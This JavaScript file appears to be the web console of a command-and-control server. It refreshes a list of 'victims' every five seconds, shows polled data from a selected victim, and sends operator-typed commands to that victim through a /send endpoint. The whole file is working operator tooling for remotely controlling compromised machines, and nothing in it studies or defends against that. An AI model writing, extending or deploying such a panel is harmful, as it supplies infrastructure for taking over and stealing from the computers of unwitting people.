function loadVictims() {
    fetch("/").then(res => res.text()).then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, "text/html");
        const victims = Array.from(doc.querySelectorAll(".victim-list li")).map(li => li.textContent);
        const select = document.getElementById("victim-select");
        select.innerHTML = "";
        victims.forEach(v => {
            const opt = document.createElement("option");
            opt.value = v;
            opt.innerText = v;
            select.appendChild(opt);
        });
    });
}

function loadVictim() {
    const selected = document.getElementById("victim-select").value;
    if (!selected) return;

    fetch(`/poll/${selected}`).then(res => res.json()).then(data => {
        document.getElementById("output").innerText = JSON.stringify(data, null, 2);
    });
}

function sendCommand() {
    const selected = document.getElementById("victim-select").value;
    const cmd = document.getElementById("command-input").value;
    fetch("/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: selected, command: cmd })
    });
}

setInterval(loadVictims, 5000);